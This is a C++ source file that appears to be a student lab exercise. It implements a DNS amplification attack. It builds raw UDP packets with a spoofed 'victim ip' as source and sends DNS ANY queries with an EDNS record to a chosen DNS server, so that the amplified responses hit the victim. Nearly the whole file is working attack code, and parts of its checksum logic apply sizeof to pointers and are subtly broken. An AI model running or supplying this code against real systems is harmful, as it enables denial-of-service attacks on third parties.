#include<bits/stdc++.h>
#include<netinet/ip.h>
#include<netinet/udp.h>
#include<linux/if_ether.h>
#include<linux/if_packet.h>
#include<arpa/inet.h>
#include<netinet/if_ether.h>
#include<unistd.h>
#include<sys/socket.h>

using namespace std;

struct UDP_PSEUDO_HDR{ //for checksum
	u_int32_t src;
	u_int32_t des;
	u_int8_t protocol;
	u_int16_t len;
};

unsigned short checksum(unsigned short *buffer, int i){ 
	unsigned long sum = 0;
	for (sum = 0; i > 0; i--){
		sum += *buffer++;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (unsigned short)(~sum);
}

unsigned char DNS[] = { 
0xed, 0xae, 0x01, 0x00, 0x00, 0x01, 0x00 ,0x00, 0x00, 0x00, 0x00, 0x01, 
0x04, 0x69, 0x65, 0x74, 0x66, 0x03, 0x6f, 0x72, 0x67, 0x00,  //website 
0x00, 0xff, //TYPE
0x00, 0x01,
0x00, 0x00, 0x29, 0x10, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00
};

// Task1: 0x00 0x01 -> TYPE A 
// Task2: 0x00 0xff -> TYPE ANY

// ./dns_attack <victim ip> <udp source port> <dns server ip>
int main(int argc, char *argv[]){
	int s_port = atoi(argv[2]);
	int d_port = 53; //DNS port
	char *s_ip = argv[1];
	char *d_ip = argv[3];

	int raw_sock;
	raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
	char buffer[100];
	struct iphdr *ip = (struct iphdr*)buffer;
	struct udphdr *udp = (struct udphdr*)(buffer + sizeof(struct iphdr));
	memset(buffer,0,sizeof(buffer));
	const int opt = 1;
	setsockopt(raw_sock,IPPROTO_IP,IP_HDRINCL,&opt,sizeof(opt));

	struct sockaddr_in source, destination;
	source.sin_family = AF_INET;
	destination.sin_family = AF_INET;
	source.sin_port = htons(s_port);
	destination.sin_port = htons(d_port);
	source.sin_addr.s_addr = inet_addr(s_ip);
	destination.sin_addr.s_addr = inet_addr(d_ip);
	
	cout<<"set done."<<endl;

	//ip header
	ip->ihl = 5;
	ip->version = 4;
	ip->tos = 0;
	ip->tot_len = ((sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(DNS)));
	ip->ttl = 64;
	ip->protocol = 17; //UDP
	ip->check = 0;
	ip->saddr = inet_addr(s_ip);
	ip->daddr = inet_addr(d_ip);
	//udp header
	udp->source = htons(s_port);
	udp->dest = htons(d_port);
	udp->len = htons(sizeof(struct udphdr) + sizeof(DNS));
	
	cout<<"header done."<<endl;

	//UDP checksum = pseudo header + header + payload
	char *check = new char[sizeof(struct UDP_PSEUDO_HDR) + sizeof(struct udphdr) + sizeof(DNS) + 1];
	memset(check, 0, sizeof(check));
	//udp pseudo header = udp header
	UDP_PSEUDO_HDR *p_hdr = (struct UDP_PSEUDO_HDR*)check;
	p_hdr->src = inet_addr(s_ip);
	p_hdr->des = inet_addr(d_ip);
	p_hdr->protocol = 17;
	p_hdr->len = htons(sizeof(struct udphdr) + sizeof(DNS));
	//calculate checksum
	memcpy(check, p_hdr, sizeof(p_hdr));
	memcpy(check + sizeof(p_hdr), udp, sizeof(udp));
	memcpy(check + sizeof(p_hdr) + sizeof(udp), DNS, sizeof(DNS));
	udp->check = checksum((unsigned short *)check, (sizeof(p_hdr) + sizeof(udp) + sizeof(DNS) + 1) / 2);
	//copy DNS into buffer
	memcpy(buffer + sizeof(iphdr) + sizeof(udphdr), DNS, sizeof(DNS));
	
	cout<<"start sending..."<<endl;
	
	//send 3 DNS queries
	for (int i = 0; i < 3; ++i){
		int s = sendto(raw_sock, buffer, ip->tot_len, 0, (struct sockaddr *)&destination, sizeof(destination));
		if(s < 0){
			cout<<"No."<<i<<": fail."<<endl;
		}else{
			cout<<"No."<<i<<": success."<<endl;
		}
		sleep(1);
	}
	close(raw_sock);


	return 0;
}



